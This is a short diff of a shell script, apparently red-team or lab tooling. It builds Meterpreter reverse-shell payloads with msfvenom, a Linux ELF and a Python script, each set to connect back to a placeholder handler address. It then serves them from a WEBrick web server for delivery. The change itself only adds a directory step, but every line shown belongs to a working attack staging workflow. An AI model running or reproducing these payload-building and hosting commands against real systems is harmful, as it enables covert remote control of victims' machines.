@@ -12,6 +12,9 @@ msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=HANDLER_IP LPORT=4343 -f elf
 cd ../macos
 msfvenom -p python/meterpreter/reverse_tcp LHOST=HANDLER_IP LPORT=4545 > py_meter.py
 
+echo "returning to remote directory"
+cd ..
+
 echo "starting web server"
 ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => WEBSERVER_PORT, :DocumentRoot => Dir.pwd).start' &
 
